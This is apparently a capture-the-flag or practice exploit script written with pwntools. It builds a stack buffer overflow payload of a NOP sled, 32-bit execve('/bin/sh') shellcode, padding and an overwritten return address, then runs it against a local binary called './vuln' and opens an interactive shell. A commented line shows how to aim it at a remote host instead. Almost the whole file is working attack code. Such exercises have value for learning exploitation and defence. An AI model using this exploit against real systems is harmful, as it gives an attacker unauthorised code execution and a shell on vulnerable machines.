from pwn import *
from pwn import p32
import sys
 
context.log_level = 'info'
 
BIN = "./vuln"
context.binary = BIN
 
 
size = 112
offset = 40
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
buf_start_addr = 0xffffcb7c # put your value here ex: 0xffffd12c
# 0xffffcacc
padding = size - len(shellcode) - offset 
 
# p32 is used to pack our adress and make it just fit for use in our payload
# ex 0xffffd12c => \x2c\xd1\xff\xff 
payload = b"\x90" * offset + shellcode + b"A" * padding + p32(buf_start_addr)
 
print(len(payload))
sys.stdout.buffer.write(payload)
 
#we use process to launch our target we can specify other args or set target to remote
# io = remote('<ip>', <port>)
io = process([BIN, payload])
 
#use this to avoid terminating connection (usefull when trying to get shell)
io.interactive()